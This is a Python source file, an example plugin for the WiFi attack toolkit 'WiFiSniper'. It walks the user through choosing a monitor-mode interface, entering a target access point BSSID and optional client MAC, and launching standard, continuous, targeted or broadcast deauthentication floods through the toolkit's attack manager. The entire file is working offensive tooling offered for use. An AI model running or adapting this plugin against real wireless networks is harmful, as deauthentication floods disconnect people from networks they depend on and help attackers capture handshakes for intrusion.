"""
Example attack plugin for WiFiSniper
Demonstrates how to create custom attack plugins
"""

from core.plugin_base import PluginBase
from modules.attack import AttackManager
from modules.monitor_mode import scan_adapters
from utils.helpers import get_validated_input, get_user_confirmation

class CustomDeauthPlugin(PluginBase):
    name = "Custom Deauthentication"
    description = "Advanced deauthentication attack with custom timing and targeting"
    category = "attacks"
    version = "1.0.0"

    def run(self, **kwargs):
        """Main plugin execution"""
        print("\n" + "="*60)
        print("Custom Deauthentication Plugin")
        print("="*60)

        # Check for monitor interfaces
        adapters = scan_adapters()
        monitor_interfaces = []

        for adapter in adapters:
            from modules.monitor_mode import get_adapter_info
            info = get_adapter_info(adapter['interface'])
            if info and info.get('mode') == 'Monitor':
                monitor_interfaces.append(adapter['interface'])

        if not monitor_interfaces:
            self.logger.error("No interfaces in monitor mode found")
            self.logger.info("Please enable monitor mode first")
            return

        print("\nAvailable monitor interfaces:")
        for i, interface in enumerate(monitor_interfaces, 1):
            print(f"{i}. {interface}")

        choice = input("Select interface (number): ").strip()
        if not choice.isdigit() or not (1 <= int(choice) <= len(monitor_interfaces)):
            self.logger.error("Invalid selection")
            return

        selected_interface = monitor_interfaces[int(choice) - 1]

        # Get attack parameters
        bssid = get_validated_input("Enter target BSSID (e.g., 00:11:22:33:44:55): ",
                                   lambda x: len(x.split(':')) == 6 and all(len(part) == 2 for part in x.split(':')),
                                   "Invalid BSSID format. Use format: 00:11:22:33:44:55")

        # Advanced options
        print("\nAttack Configuration:")
        print("1. Standard deauth")
        print("2. Continuous deauth")
        print("3. Targeted client deauth")
        print("4. Broadcast deauth")

        attack_type = input("Choose attack type (1-4): ").strip()

        if attack_type == "3":
            client_mac = get_validated_input("Enter client MAC address: ",
                                           lambda x: len(x.split(':')) == 6 and all(len(part) == 2 for part in x.split(':')),
                                           "Invalid MAC format. Use format: 00:11:22:33:44:55")
        else:
            client_mac = None

        # Timing options
        if attack_type in ["1", "3", "4"]:
            count = input("Number of packets (default 10): ").strip()
            count = int(count) if count.isdigit() else 10
        else:
            count = 0  # Continuous

        delay = input("Delay between packets (seconds, default 0.1): ").strip()
        delay = float(delay) if delay.replace('.', '').isdigit() else 0.1

        # Execute attack
        manager = AttackManager()

        if not get_user_confirmation("Execute deauthentication attack?"):
            self.logger.info("Attack cancelled by user")
            return

        success = manager.deauth_attack(bssid, client_mac, count, delay, selected_interface)

        if success:
            self.logger.success("Custom deauthentication attack completed")
        else:
            self.logger.error("Custom deauthentication attack failed")

    def get_menu_options(self):
        """Return menu options for this plugin"""
        return [
            {
                "name": "Run Custom Deauth Attack",
                "function": self.run
            }
        ]